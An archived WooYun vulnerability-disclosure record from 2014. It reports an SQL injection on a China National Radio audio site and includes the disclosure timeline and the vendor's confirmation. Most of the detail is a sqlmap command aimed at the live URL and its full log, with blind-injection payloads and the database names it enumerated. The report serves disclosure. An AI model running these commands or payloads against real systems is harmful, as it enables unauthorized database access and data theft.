{"id": 59179, "wybug_id": "wooyun-2014-048333", "wybug_title": "中国广播网一处sql注入可跨库2", "wybug_corp": "中国广播网", "wybug_author": "Mosuan", "wybug_date": "2014-01-12 10:58", "wybug_open_date": "2014-02-26 10:59", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "15", "wybug_status": "已交由第三方合作机构(cncert国家互联网应急中心)处理", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["数字类型注射", "数据库账户权限过高"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-01-12：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-01-17：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2014-01-27：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2014-02-06：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2014-02-16：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2014-02-26：\t细节向公众公开  简要描述： sql 详细说明：  注入点\nhttp://audio.cnr.cn/index.php?option=com_content&ItemId=794\n免python环境的sqlmap跑的。\n[root@Hacker~]# Sqlmap Sqlmap -u \"http://audio.cnr.cn/index.php?option=com_content&ItemId=794\" --dbs    sqlmap/1.0-dev - automatic SQL injection and database takeover tool    http://sqlmap.org[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicablelocal, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program[*] starting at 22:42:44[22:42:44] [INFO] testing connection to the target url[22:42:45] [INFO] testing if the url is stable, wait a few seconds[22:42:46] [INFO] url is stable[22:42:46] [INFO] testing if GET parameter 'option' is dynamicsqlmap got a refresh request (redirect like response common to login pages). Doyou want to apply the refresh from now on (or stay on the original page)? [Y/n]y[22:42:52] [INFO] confirming that GET parameter 'option' is dynamic[22:42:52] [INFO] GET parameter 'option' is dynamic[22:42:53] [WARNING] reflective value(s) found and filtering out[22:42:53] [WARNING] heuristic test shows that GET parameter 'option' might notbe injectable[22:42:53] [INFO] testing for SQL injection on GET parameter 'option'[22:42:54] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'[22:43:04] [INFO] testing 'MySQL >= 5.0 AND error-based - WHERE or HAVING clause'[22:43:08] [INFO] testing 'PostgreSQL AND error-based - WHERE or HAVING clause'[22:43:12] [INFO] testing 'Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause'[22:43:16] [INFO] testing 'Oracle AND error-based - WHERE or HAVING clause (XMLType)'[22:43:21] [INFO] testing 'MySQL > 5.0.11 stacked queries'[22:43:25] [INFO] testing 'PostgreSQL > 8.1 stacked queries'[22:43:29] [INFO] testing 'Microsoft SQL Server/Sybase stacked queries'[22:43:33] [INFO] testing 'MySQL > 5.0.11 AND time-based blind'[22:43:37] [INFO] testing 'PostgreSQL > 8.1 AND time-based blind'[22:43:41] [INFO] testing 'Microsoft SQL Server/Sybase time-based blind'[22:43:46] [INFO] testing 'Oracle AND time-based blind'[22:43:53] [INFO] testing 'MySQL UNION query (NULL) - 1 to 10 columns'[22:45:02] [INFO] testing 'Generic UNION query (NULL) - 1 to 10 columns'[22:45:02] [WARNING] using unescaped version of the test because of zero knowledge of the back-end DBMS. You can try to explicitly set it using the --dbms option[22:46:14] [WARNING] GET parameter 'option' is not injectable[22:46:14] [INFO] testing if GET parameter 'ItemId' is dynamic[22:46:18] [INFO] confirming that GET parameter 'ItemId' is dynamic[22:46:19] [INFO] GET parameter 'ItemId' is dynamic[22:46:20] [WARNING] heuristic test shows that GET parameter 'ItemId' might notbe injectable[22:46:20] [INFO] testing for SQL injection on GET parameter 'ItemId'[22:46:20] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'[22:46:21] [INFO] GET parameter 'ItemId' is 'AND boolean-based blind - WHERE orHAVING clause' injectable[22:46:21] [INFO] testing 'MySQL >= 5.0 AND error-based - WHERE or HAVING clause'[22:46:22] [INFO] testing 'PostgreSQL AND error-based - WHERE or HAVING clause'[22:46:22] [INFO] testing 'Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause'[22:46:23] [INFO] testing 'Oracle AND error-based - WHERE or HAVING clause (XMLType)'[22:46:23] [INFO] testing 'MySQL > 5.0.11 stacked queries'[22:46:23] [INFO] testing 'PostgreSQL > 8.1 stacked queries'[22:46:24] [INFO] testing 'Microsoft SQL Server/Sybase stacked queries'[22:46:24] [INFO] testing 'MySQL > 5.0.11 AND time-based blind'[22:47:24] [INFO] GET parameter 'ItemId' is 'MySQL > 5.0.11 AND time-based blind' injectable[22:47:24] [INFO] testing 'MySQL UNION query (NULL) - 1 to 20 columns'[22:47:24] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other potential injection technique found[22:47:46] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'GET parameter 'ItemId' is vulnerable. Do you want to keep testing the others (if any)? [y/N] ysqlmap identified the following injection points with a total of 232 HTTP(s) requests:---Place: GETParameter: ItemId    Type: boolean-based blind    Title: AND boolean-based blind - WHERE or HAVING clause    Payload: option=com_content&ItemId=794) AND 1052=1052 AND (5579=5579    Type: AND/OR time-based blind    Title: MySQL > 5.0.11 AND time-based blind    Payload: option=com_content&ItemId=794) AND SLEEP(5) AND (4879=4879---[22:50:29] [INFO] the back-end DBMS is MySQLweb application technology: PHP 5.2.17back-end DBMS: MySQL 5.0.11[22:50:29] [INFO] fetching database names[22:50:29] [INFO] fetching number of databases[22:50:29] [WARNING] running in a single-thread mode. Please consider usage of option '--threads' for faster data retrieval[22:50:29] [INFO] retrieved: 6[22:50:33] [INFO] retrieved: information_schema[22:52:13] [INFO] retrieved: mysql[22:52:41] [INFO] retrieved: shinyv_product_cis_ypsj_2_[22:57:01] [CRITICAL] unable to connect to the target url or proxy, sqlmap is going to retry the request2[22:57:18] [INFO] retrieved: shinyv_statistics_2_2_dev[23:06:08] [INFO] retrieved: shinyv_ttx[23:07:26] [INFO] retrieved: testavailable databases [6]:[*] information_schema[*] mysql[*] shinyv_product_cis_ypsj_2_2[*] shinyv_statistics_2_2_dev[*] shinyv_ttx[*] test[23:08:33] [WARNING] cannot properly display Unicode characters inside Windows OS command prompt (http://bugs.python.org/issue1602). All unhandled occurances will result in replacement with '?' character. Please, find proper character representation inside corresponding output files.[23:08:33] [INFO] fetched data logged to text files under 'C:\\DOCUME~1\\ADMINI~1\\??\\???~1\\SQLMAP~1\\Bin\\output\\audio.cnr.cn'\n   漏洞证明：  看详细说明   修复方案：  过滤   版权声明：转载请注明来源 Mosuan@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：中 漏洞Rank：10  确认时间：2014-01-17 08:51 厂商回复：   最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "中", "wybug_rank_fromcorp": 10, "Ranks": null}